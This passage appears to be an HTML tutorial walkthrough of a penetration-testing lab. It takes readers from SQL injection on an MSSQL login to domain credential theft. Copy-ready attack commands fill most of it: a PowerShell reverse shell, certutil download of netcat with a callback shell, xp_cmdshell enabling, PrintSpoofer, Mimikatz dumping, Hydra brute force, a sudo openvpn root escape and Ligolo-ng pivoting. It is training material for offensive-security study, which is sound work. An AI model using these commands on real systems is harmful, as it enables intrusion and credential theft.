+      <p class="dim"><code class="inline">rustscan</code> is a fast wrapper that hands off to <code class="inline">nmap</code> for detailed service detection — <code class="inline">-sV</code> grabs version info, <code class="inline">-sC</code> runs default scripts.</p>
+
+      <p><strong>Results:</strong></p>
+      <ul>
+        <li><strong>.120</strong> — SSH (22), HTTP (80)</li>
+        <li><strong>.121</strong> — HTTP (80), SMB (135/139/445), WinRM (5985)</li>
+        <li><strong>.122</strong> — SSH (22) only</li>
+      </ul>
+
+      <div class="callout why">
+        <div class="co-head"><span class="icon">?</span>Why focus on port 80, when .121 also has 135/139/445/5985 open?<span class="chev">▾</span></div>
+        <div class="co-body">
+          <p>Ports 135, 139, and 445 are Windows' own networking/file-sharing plumbing (RPC and SMB), and 5985 is WinRM (remote PowerShell management). All four are standard, built-in Windows services — they run stock Microsoft code, and critically, almost all of them expect you to already have valid domain credentials before they'll let you do anything interesting. You don't have any credentials yet at this point, so those ports are dead ends for now (you'll come back to WinRM later, once you've stolen a password).</p>
+          <p>Port 80, on the other hand, is running a custom web application — code this specific company's developers wrote. Custom code is exactly where custom mistakes live. Standard services are usually only attackable once you have creds or a known unpatched CVE, whereas a bespoke web app is worth probing first because it's unique, unaudited, and reachable with zero prior access.</p>
+        </div>
+      </div>
+
+      <div class="callout why">
+        <div class="co-head"><span class="icon">?</span>Why WEB02 (.121) next, and not .120 or .122?<span class="chev">▾</span></div>
+        <div class="co-body">
+          <p>Recon isn't just "list open ports" — it's "which open ports give me the most to try?" .120 and .122 each expose a single service (SSH). .121 exposes a website AND SMB AND WinRM — more services means more surface area, and a website in particular means there's a login form, input fields, and application logic to test. Attack the richest, most interactive surface first.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ---- HOST: WEB02 ---- -->
+    <div class="host-card" id="host-web02">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 01</span>
+        <div class="hc-titles"><div class="hc-ip">192.168.247.121</div><h3>WEB02 — Foothold &amp; Local Admin</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span>
+        <span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="badge-row"><span class="badge">SQLi</span><span class="badge">MSSQL</span><span class="badge">xp_cmdshell</span><span class="badge">PrintSpoofer</span><span class="badge">Mimikatz</span></div>
+
+        <h4 class="step">Step 1 — Find the SQL injection</h4>
+        <p>Browse to the site on port 80. There's a login page with a username field and a password field.</p>
+
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why the login page specifically?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Login forms are one of the highest-value targets on any website because they're one of the few places an anonymous visitor is allowed to send data straight into a database query. A successful bypass doesn't just leak data — it can hand you an authenticated session outright.</p></div>
+        </div>
+
+        <p><strong>Finding the actual field name.</strong> Right-click the username box → "Inspect" (or view page source) and look for its HTML <code class="inline">&lt;input&gt;</code> tag:</p>
+        <div class="codebox"><div class="cb-head"><span>html</span><button class="copy-btn">Copy</button></div>
+          <pre>&lt;input type="text" name="ctl00$ContentPlaceHolder1$UsernameTextBox" ... /&gt;</pre></div>
+        <p class="dim">That <code class="inline">name="..."</code> value is what you'll hand to <code class="inline">sqlmap</code> later with <code class="inline">-p</code>. The long <code class="inline">ctl00$...</code> naming is typical of ASP.NET WebForms — an early hint this backend is Microsoft/IIS, and therefore possibly MSSQL.</p>
+
+        <p><strong>Manual test:</strong> type a single quote (<code class="inline">'</code>) into the username field and submit. A database error, or a very different response than a normal "wrong password," is the classic tell.</p>
+
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>What is SQL injection, really?<span class="chev">▾</span></div>
+          <div class="co-body"><p>A web app builds a database query by gluing your input directly into a string of SQL code. If the developer doesn't sanitize that input, a character like <code class="inline">'</code> can "break out" of the intended string and let you inject your own SQL logic — turning a login box into a way to talk directly to the database.</p></div>
+        </div>
+
+        <h4 class="step">Step 2 — Confirm &amp; automate with sqlmap (optional, good practice)</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why automate what you already confirmed by hand?<span class="chev">▾</span></div>
+          <div class="co-body"><p>You've proven the injection exists, but not how deep it goes — which engine, which tables, whether it escalates to command execution. <code class="inline">sqlmap</code> answers those systematically and leaves a repeatable record of what worked.</p></div>
+        </div>
+
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>Where does req_121.txt actually come from?<span class="chev">▾</span></div>
+          <div class="co-body">
+            <p><code class="inline">sqlmap</code> needs the complete raw HTTP request — every header, cookie, and form field exactly as the browser sent it — because the injection point is inside a POST body a plain URL can't represent. Capture it with <strong>Burp Suite</strong>:</p>
+            <ol>
+              <li>Open Burp Suite → <strong>Proxy</strong> tab → turn <strong>Intercept</strong> on.</li>
+              <li>In Burp's browser (or your browser configured to proxy through <code class="inline">127.0.0.1:8080</code>), submit the login form.</li>
+              <li>Burp pauses the request and shows the raw HTTP text — headers, cookies, and the POST body containing your field.</li>
+              <li>Right-click → <strong>Save item</strong> → save as <code class="inline">req_121.txt</code>. Turn Intercept back off.</li>
+            </ol>
+            <p>That file lets <code class="inline">sqlmap</code> replay your exact login attempt while swapping in injection payloads.</p>
+          </div>
+        </div>
+
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+          <pre>sqlmap -r req_121.txt --level 5 --risk 3 --batch --dbs \
+  -p ctl00%24ContentPlaceHolder1%24UsernameTextBox</pre></div>
+        <ul>
+          <li><code class="inline">-r req_121.txt</code> — read the raw request saved from Burp</li>
+          <li><code class="inline">--level 5 --risk 3</code> — try harder / riskier injection techniques</li>
+          <li><code class="inline">-p &lt;param&gt;</code> — target the field from Step 1 (<code class="inline">$</code> becomes <code class="inline">%24</code>, URL-encoded)</li>
+          <li><code class="inline">--dbs</code> — list databases once injection is confirmed</li>
+        </ul>
+        <p>This confirms the backend is <strong>MSSQL</strong>.</p>
+
+        <h4 class="step">Step 3 — Turn the injection into code execution</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why go from "read the database" to "run OS commands"?<span class="chev">▾</span></div>
+          <div class="co-body"><p>MSSQL ships a stored procedure, <code class="inline">xp_cmdshell</code>, that runs OS commands directly. Reaching it turns a data-layer bug into full command execution — always the next question after confirming SQLi against MSSQL.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>sql</span><button class="copy-btn">Copy</button></div>
+          <pre>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--</pre></div>
+        <p class="dim"><code class="inline">xp_cmdshell</code> is disabled by default precisely because it's this dangerous — but <code class="inline">sp_configure</code> is a normal admin command, so if your injected user has rights, you turn it back on yourself.</p>
+
+        <h4 class="step">Step 4 — Get a shell</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why a reverse shell instead of one-off commands?<span class="chev">▾</span></div>
+          <div class="co-body"><p><code class="inline">xp_cmdshell</code> lets you run a single command at a time — clunky. A reverse shell makes the target connect back to you, giving a live prompt, and routes around inbound firewall rules since outbound connections are almost always allowed.</p></div>
+        </div>
+
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>Every IP like 192.168.45.x below is YOUR machine — find your own<span class="chev">▾</span></div>
+          <div class="co-body">
+            <p>IPs such as <code class="inline">192.168.45.187</code> refer to the Kali attack box's own VPN address — not a fixed value to copy verbatim. Find yours first:</p>
+            <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>ip a show tun0</pre></div>
+            <p>Look for the <code class="inline">inet</code> line under <code class="inline">tun0</code>. Substitute it into every <code class="inline">LHOST</code>, listener, and URL below. Mismatched IPs are the most common reason a shell "silently fails."</p>
+          </div>
+        </div>
+
+        <p><strong>Option A — PowerShell one-liner, injected via SQLi.</strong> Start a listener on Kali first:</p>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>rlwrap -cAr nc -lvnp 4444</pre></div>
+        <p>Then inject (using your own Kali IP):</p>
+        <div class="codebox"><div class="cb-head"><span>powershell</span><button class="copy-btn">Copy</button></div>
+<pre>powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.45.187', 4444);
+$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
+function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};
+$StreamWriter.Write($String + 'SHELL&gt; ');$StreamWriter.Flush()}WriteToStream '';
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
+$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}
+WriteToStream ($Output)}$StreamWriter.Close()"</pre></div>
+
+        <p><strong>Option B — download-and-execute netcat via xp_cmdshell.</strong></p>
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>The file-transfer pattern you'll reuse all lab<span class="chev">▾</span></div>
+          <div class="co-body">
+            <p>Almost every "upload X to the target" moment in this lab uses the same two steps: (1) serve the file from Kali over HTTP, (2) have the target fetch it with a built-in tool.</p>
+            <div class="codebox"><div class="cb-head"><span>bash — on Kali</span><button class="copy-btn">Copy</button></div><pre>python3 -m http.server 8000</pre></div>
+            <div class="codebox"><div class="cb-head"><span>cmd — on target</span><button class="copy-btn">Copy</button></div><pre>certutil -urlcache -f http://&lt;your-kali-ip&gt;:8000/&lt;filename&gt; C:\windows\temp\&lt;filename&gt;</pre></div>
+            <p><code class="inline">certutil</code> is a legitimate, built-in Windows certificate tool repurposed to fetch a URL. Every later "upload" step reuses this exact pattern.</p>
+          </div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>sql</span><button class="copy-btn">Copy</button></div>
+          <pre>EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.249:8000/nc.exe C:\windows\temp\nc.exe';
+EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.249 9005 -e cmd.exe';--</pre></div>
+        <p>Either way, you land a shell as the SQL service account — <strong>not</strong> an administrator yet.</p>
+
+        <hr class="rule">
+        <h3>Local Privilege Escalation → SYSTEM</h3>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why escalate at all — isn't a shell enough?<span class="chev">▾</span></div>
+          <div class="co-body"><p>A service-account shell can't read other users' credentials from memory or be trusted by other machines. Almost everything valuable from here — dumping creds, pivoting — requires SYSTEM/Administrator on this box first.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>whoami /priv</pre></div>
+        <p>Look for <code class="inline">SeImpersonatePrivilege</code> — state <code class="inline">Enabled</code>.</p>
+
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>Potato exploits, explained<span class="chev">▾</span></div>
+          <div class="co-body"><p>Service accounts often hold <code class="inline">SeImpersonatePrivilege</code> so they can legitimately impersonate a connecting client. "Potato" exploits (RottenPotato → JuicyPotato → PrintSpoofer → newer variants) trick a SYSTEM-level service into authenticating to a small attacker-controlled listener, then steal and reuse that SYSTEM token. Rule of thumb: privilege Enabled ⇒ a Potato variant is almost always instant SYSTEM.</p></div>
+        </div>
+
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why PrintSpoofer specifically?<span class="chev">▾</span></div>
+          <div class="co-body"><p>You just confirmed the exact precondition Potato exploits need. PrintSpoofer works on most modern, patched builds — try it first; JuicyPotato is the fallback for older systems.</p></div>
+        </div>
+        <p>Transfer <code class="inline">PrintSpoofer64.exe</code> using the file-transfer pattern above, then run it:</p>
+        <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>PrintSpoofer64.exe -i -c cmd</pre></div>
+        <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>type C:\Users\Administrator\Desktop\proof.txt</pre></div>
+        <div class="flag">🏁 proof.txt captured</div>
+
+        <hr class="rule">
+        <h3>Post-Exploitation — Credential Harvest</h3>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why hunt for creds now instead of moving on?<span class="chev">▾</span></div>
+          <div class="co-body"><p>SYSTEM on one isolated DMZ box doesn't get you into the internal domain by itself — but it lets you read every process's memory, including cached domain credentials. That's what actually unlocks the next network.</p></div>
+        </div>
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>Mimikatz, explained<span class="chev">▾</span></div>
+          <div class="co-body"><p>Windows caches credentials in the LSASS process's memory. Mimikatz reads LSASS and extracts plaintext passwords (if conditions allow), NTLM hashes, and Kerberos tickets. Needs SYSTEM/Admin — exactly what you have now.</p></div>
+        </div>
+        <p>Transfer <code class="inline">mimikatz.exe</code>, then run interactively:</p>
+        <div class="codebox"><div class="cb-head"><span>mimikatz</span><button class="copy-btn">Copy</button></div>
+          <pre>mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonPasswords</pre></div>
+        <p>Result: <code class="inline">joe : Flowers1</code> — your first domain credential.</p>
+        <div class="codebox"><div class="cb-head"><span>mimikatz</span><button class="copy-btn">Copy</button></div><pre>mimikatz # lsadump::sam</pre></div>
+
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why keep looking after finding one password?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Good post-exploitation is thorough by habit — check user lists, recent downloads, network connections — because looking costs little and the payoff can be decisive.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>net user /domain</pre></div>
+        <p>Users found: <code class="inline">joe, leon, mario, offsec, peach, wario, yoshi</code>. A <code class="inline">test.zip</code> in joe's Downloads held <code class="inline">sa : WhileChirpTuesday218</code>, and <code class="inline">netstat -ano</code> showed a connection toward <code class="inline">172.16.x.x</code> — a hint this box bridges both networks.</p>
+
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why does a netstat connection matter so much?<span class="chev">▾</span></div>
+          <div class="co-body"><p>It's direct evidence — not a guess — that this machine can already reach the internal network somehow. It marks this box (or others like it) as a candidate pivot point.</p></div>
+        </div>
+        <a class="next-target" href="#host-vpn122"><span><span class="nt-label">Next Target</span><span class="nt-name">VPN Host (.122) — Foothold &amp; Root</span></span><span class="nt-arrow">→</span></a>
+      </div>
+    </div>
+
+    <!-- ---- HOST: VPN122 ---- -->
+    <div class="host-card" id="host-vpn122">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 02</span>
+        <div class="hc-titles"><div class="hc-ip">192.168.247.122</div><h3>VPN Host — Foothold &amp; Root</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span>
+        <span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="badge-row"><span class="badge">Hydra</span><span class="badge">GTFOBins</span><span class="badge">sudo misconfig</span></div>
+
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why turn to the VPN host now?<span class="chev">▾</span></div>
+          <div class="co-body"><p>It's the other external box you haven't cracked, and its role name ("VPN") plus the netstat clue on WEB02 both suggest it may bridge external and internal networks. That naming/role hint is worth chasing as a pivot candidate.</p></div>
+        </div>
+
+        <h4 class="step">Step 1 — Brute-force SSH</h4>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+          <pre>hydra -l offsec -P /usr/share/wordlists/rockyou.txt -f 192.168.247.122 ssh</pre></div>
+        <ul>
+          <li><code class="inline">-l offsec</code> — a single known username</li>
+          <li><code class="inline">-P &lt;wordlist&gt;</code> — try every password in this file</li>
+          <li><code class="inline">-f</code> — stop after the first success</li>
+        </ul>
+        <p>Result: <code class="inline">offsec : password</code>.</p>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>ssh offsec@192.168.247.122</pre></div>
+        <div class="flag">🏁 local.txt captured</div>
+
+        <h4 class="step">Step 2 — Privilege escalation via sudo misconfiguration</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why check sudo rights before anything fancier?<span class="chev">▾</span></div>
+          <div class="co-body"><p><code class="inline">sudo -l</code> costs nothing and instantly shows what this account can run as another user. Misconfigured sudo rights are one of the most common Linux privesc paths — rule this out first.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>sudo -l</pre></div>
+        <p>Shows <code class="inline">openvpn</code> allowed with no password. OpenVPN can run arbitrary shell scripts via <code class="inline">--up</code>:</p>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+          <pre>sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'</pre></div>
+        <div class="flag">🏁 proof.txt captured — root</div>
+
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>GTFOBins<span class="chev">▾</span></div>
+          <div class="co-body"><p><a href="https://gtfobins.github.io" target="_blank" rel="noopener">GTFOBins</a> is a curated list of standard Unix binaries that can bypass restrictions when granted excess sudo/SUID rights. Whenever <code class="inline">sudo -l</code> shows an unusual binary, check GTFOBins for it.</p></div>
+        </div>
+
+        <h4 class="step">Step 3 — Find the pivot material</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why look for an SSH key here?<span class="chev">▾</span></div>
+          <div class="co-body"><p>You already suspect this host bridges networks. Root access means you can read every file, including credential material — SSH keys are exactly what's worth searching for, since they often work unchanged on other internal machines.</p></div>
+        </div>
+        <p>An SSH private key for <code class="inline">mario</code> was found. Save locally and fix permissions:</p>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>chmod 600 mario_id_rsa</pre></div>
+        <a class="next-target" href="#host-linux14"><span><span class="nt-label">Next Target</span><span class="nt-name">172.16.247.14 — Unnamed Linux Host</span></span><span class="nt-arrow">→</span></a>
+      </div>
+    </div>
+
+    <!-- ============ PHASE 2: CONCEPTS ============ -->
+    <hr class="rule">
+    <section class="block" id="concepts">
+      <div class="phase-head"><span class="idx">§2</span><h2>Field Manual — Concept Deep-Dives</h2></div>
+      <p class="phase-desc">Read once before continuing into the internal network — everything below gets used heavily from here on.</p>
+
+      <h3>Why we need to "pivot" at all</h3>
+      <div class="callout why">
+        <div class="co-head"><span class="icon">?</span>Why can't Kali just talk to 172.16.247.0/24 directly?<span class="chev">▾</span></div>
+        <div class="co-body"><p>That internal subnet is a private domain network, deliberately unreachable from the internet or DMZ. The only way in is through a machine with one leg in each network — the VPN host, or WEB02 (per the netstat clue). Pivoting routes your Kali traffic through one of those so your existing tools can reach internal hosts directly.</p></div>
+      </div>
+
+      <h3>Potato exploits, properly explained</h3>
+      <p>Every Windows process runs under a security token describing who it is. Certain service accounts are granted <code class="inline">SeImpersonatePrivilege</code> so they can legitimately impersonate a connecting client. Potato-family exploits abuse this in four moves:</p>
+      <ol>
+        <li>Start a small local listener under the attacker's low-privileged account.</li>
+        <li>Trick a SYSTEM-level service into connecting to it — historically via a fake WebDAV/NTLM relay, or a spoofed printer notification (hence "PrintSpoofer").</li>
+        <li>Because the attacker's process holds <code class="inline">SeImpersonatePrivilege</code>, and SYSTEM just "authenticated," the exploit impersonates SYSTEM's token.</li>
+        <li>Spawn a new process using that stolen token.</li>
+      </ol>
+      <ul>
+        <li><strong>RottenPotato</strong> — oldest, mostly patched</li>
+        <li><strong>JuicyPotato</strong> — older Windows 10/Server builds; needs a valid CLSID</li>
+        <li><strong>PrintSpoofer</strong> — abuses Print Spooler; works on many modern builds</li>
+        <li><strong>RoguePotato / GodPotato</strong> — newer variants for patched systems</li>
+      </ul>
+
+      <h3>Mimikatz, properly explained</h3>
+      <table>
+        <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+        <tbody>
+          <tr><td class="mono-cell">privilege::debug</td><td>Grants Mimikatz the right to read other processes' memory. Always run first.</td></tr>
+          <tr><td class="mono-cell">sekurlsa::logonPasswords</td><td>Dumps LSASS: usernames, domains, NTLM hashes, and — if conditions allow — plaintext passwords.</td></tr>
+          <tr><td class="mono-cell">lsadump::sam</td><td>Dumps local account hashes from SAM (local accounts only).</td></tr>
+          <tr><td class="mono-cell">lsadump::lsa /patch</td><td>Dumps hashes directly from the Domain Controller's database.</td></tr>
+          <tr><td class="mono-cell">sekurlsa::tickets</td><td>Dumps Kerberos tickets — basis for Pass-the-Ticket.</td></tr>
+        </tbody>
+      </table>
+      <p class="dim">Plaintext passwords show up because some credential providers (like WDigest) keep a reversible copy in memory for compatibility. If you can't get plaintext, crack hashes offline with <code class="inline">hashcat</code>, or reuse the hash directly (Pass-the-Hash) — many tools accept a hash in place of a password.</p>
+
+      <h3>Ligolo-ng, properly explained</h3>
+      <p>A modern pivoting tool with two pieces: <strong>proxy</strong> (runs on Kali) and <strong>agent</strong> (a small binary dropped on the compromised host). Once the agent connects, Ligolo-ng creates a virtual interface on Kali and you add a route to it — from then on, Kali talks to the internal network directly.</p>
+      <div class="codebox"><div class="cb-head"><span>bash — Kali</span><button class="copy-btn">Copy</button></div>
+        <pre>sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert</pre></div>
+      <div class="codebox"><div class="cb-head"><span>cmd — target</span><button class="copy-btn">Copy</button></div><pre>agent.exe -connect 192.168.45.XXX:11601 -ignore-cert</pre></div>
+      <div class="codebox"><div class="cb-head"><span>ligolo-ng proxy console</span><button class="copy-btn">Copy</button></div><pre>session
+start</pre></div>
+      <div class="codebox"><div class="cb-head"><span>bash — Kali</span><button class="copy-btn">Copy</button></div><pre>sudo ip route add 172.16.247.0/24 dev ligolo</pre></div>
+
+      <div class="callout why">
+        <div class="co-head"><span class="icon">?</span>Why does the entire internal phase hinge on this?<span class="chev">▾</span></div>
+        <div class="co-body"><p>Nothing in Phase 3 works without a route into <code class="inline">172.16.247.0/24</code> first. Get the tunnel up before trying anything internal, and re-check <code class="inline">ip route</code> if a tool suddenly can't reach a host it should.</p></div>
+      </div>
+
+      <h3>BloodHound, properly explained <span style="color:var(--text-faint); font-family:var(--sans); font-weight:400; font-size:14px;">(bonus — not strictly required here)</span></h3>
+      <p>Once inside AD with any valid domain credential, the next question is always: <strong>what's the shortest path to Domain Admin?</strong> BloodHound collects users, groups, computers, sessions, and ACLs, and renders them as a graph you can query visually.</p>
+      <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+        <pre>bloodhound-python -u joe -p 'Flowers1' -d medtech.local -ns 172.16.247.10 -c All</pre></div>
+      <p class="dim">Mark held credentials as "owned," then run "Find Shortest Paths to Domain Admins" — BloodHound highlights the exact chain to follow.</p>
+      <div class="callout why">
+        <div class="co-head"><span class="icon">?</span>Why mention this if the lab doesn't strictly need it?<span class="chev">▾</span></div>
+        <div class="co-body"><p>This lab's path happens to be mostly linear via manual credential reuse — that's a property of this lab, not of real networks. In a bigger environment, BloodHound is usually the first thing run after any domain credential, turning "guess and check across dozens of hosts" into "follow the highlighted path."</p></div>
+      </div>
+    </section>
+
+    <!-- ============ PHASE 3 ============ -->
+    <hr class="rule">
+    <section class="block" id="phase3">
+      <div class="phase-head"><span class="idx">§3</span><h2>Phase 3 — Internal Network</h2></div>
+      <p class="phase-desc">You should now have a Ligolo-ng tunnel into <code class="inline">172.16.247.0/24</code>, plus: domain users <code class="inline">joe, leon, mario, offsec, peach, wario, yoshi</code>; <code class="inline">joe:Flowers1</code>; <code class="inline">offsec:password</code>; <code class="inline">sa:WhileChirpTuesday218</code>; and mario's SSH key.</p>
+    </section>
+
+    <div class="host-card" id="host-linux14">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 03</span>
+        <div class="hc-titles"><div class="hc-ip">172.16.247.14</div><h3>Unnamed Linux Host</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span><span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why go here first, out of seven internal hosts?<span class="chev">▾</span></div>
+          <div class="co-body"><p>It's the only internal host with SSH open, and you're holding an SSH private key. When loot only fits one lock, try that lock first — fastest possible win, even if (as here) it's a dead end.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>ssh -i mario_id_rsa mario@172.16.247.14</pre></div>
+        <div class="flag">🏁 local.txt captured</div>
+        <p class="dim">This host doesn't lead to root in this lab — a dead end, and that's fine. Part of the skill is recognizing a dead end and moving on.</p>
+        <a class="next-target" href="#host-files02"><span><span class="nt-label">Next Target</span><span class="nt-name">FILES02 (.11) — Shell as joe</span></span><span class="nt-arrow">→</span></a>
+      </div>
+    </div>
+
+    <div class="host-card" id="host-files02">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 04</span>
+        <div class="hc-titles"><div class="hc-ip">172.16.247.11</div><h3>FILES02 — Shell as joe</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span><span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="badge-row"><span class="badge">nxc</span><span class="badge">Evil-WinRM</span><span class="badge">hashcat</span></div>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why try joe's credential against this host next?<span class="chev">▾</span></div>
+          <div class="co-body"><p><code class="inline">joe/Flowers1</code> is domain-wide, and WinRM is open on several internal hosts — check which ones actually accept it rather than guessing one at a time.</p></div>
+        </div>
+        <h4 class="step">Step 1 — Confirm credentials before committing to a full session</h4>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>nxc winrm 172.16.247.11 -u joe -p Flowers1</pre></div>
+        <p class="dim">A green <code class="inline">[+]</code> means the login is valid. <code class="inline">nxc</code> exists so you don't manually attempt a full login against every host — test cheaply first.</p>
+        <h4 class="step">Step 2 — Get an interactive shell</h4>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>evil-winrm -i 172.16.247.11 -u joe -p Flowers1</pre></div>
+        <div class="flag">🏁 local.txt + proof.txt captured</div>
+        <p class="dim"><code class="inline">net localgroup Administrators</code> shows joe is already a local admin here — no further escalation needed.</p>
+        <h4 class="step">Step 3 — Harvest more credentials</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why keep digging when you're already admin?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Being admin on one machine is a stepping stone, not the goal. Any file that looks like it stores credentials is worth reading, because the next hop almost always comes from exactly this.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>type C:\Users\joe\Documents\fileMonitorBackup.log</pre></div>
+        <pre class="mono" style="background:#0A0F15; border:1px solid var(--border-soft); padding:12px 16px; border-radius:3px; font-size:13px; color:#D6E1EC; overflow-x:auto;">goomba : 8e9e1516818ce4e54247e71e71b5f436
+toad   : 5be63a865b65349851c1f11a067a3068
+daisy  : abf36048c1cf88f5603381c5128feb8e
+wario  : fdf36048c1cf88f5630381c5e38feb8e</pre>
+        <h4 class="step">Step 4 — Crack the hashes offline with hashcat</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why crack instead of using the hashes as-is?<span class="chev">▾</span></div>
+          <div class="co-body"><p>A hash can sometimes be used directly (Pass-the-Hash), but a plaintext password is more broadly useful — it might work elsewhere too, as a habit of the same human. Cracking costs nothing but time.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt</pre></div>
+        <p>Only wario's cracks: <code class="inline">wario : Mushroom!</code>. The others simply aren't in the wordlist — realistic; not every hash cracks.</p>
+        <a class="next-target" href="#host-client02"><span><span class="nt-label">Next Target</span><span class="nt-name">CLIENT02 (.83) — Shell as wario</span></span><span class="nt-arrow">→</span></a>
+      </div>
+    </div>
+
+    <div class="host-card" id="host-client02">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 05</span>
+        <div class="hc-titles"><div class="hc-ip">172.16.247.83</div><h3>CLIENT02 — Shell as wario</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span><span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="badge-row"><span class="badge">WinPEAS</span><span class="badge">Writable service</span></div>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why move to CLIENT02 next?<span class="chev">▾</span></div>
+          <div class="co-body"><p>You just minted a fresh credential (<code class="inline">wario/Mushroom!</code>) and haven't used it anywhere. The natural move is to test it against unchecked hosts — CLIENT02 has WinRM open.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+          <pre>nxc winrm 172.16.247.83 -u wario -p 'Mushroom!'
+evil-winrm -i 172.16.247.83 -u wario -p 'Mushroom!'</pre></div>
+        <div class="flag">🏁 local.txt captured</div>
+        <p class="dim">wario is <strong>not</strong> a local admin here — escalation needed.</p>
+
+        <h4 class="step">Privilege escalation: writable service binary</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why run WinPEAS instead of checking manually?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Dozens of possible misconfigurations exist — checking each by hand is slow. WinPEAS automates the checklist so you spend time acting on findings, not hunting for them.</p></div>
+        </div>
+        <p>Evil-WinRM ships a built-in <code class="inline">upload</code> command — easier than the certutil trick:</p>
+        <div class="codebox"><div class="cb-head"><span>evil-winrm</span><button class="copy-btn">Copy</button></div><pre>upload /path/on/kali/winPEASx64.exe C:\Users\wario\winPEASx64.exe</pre></div>
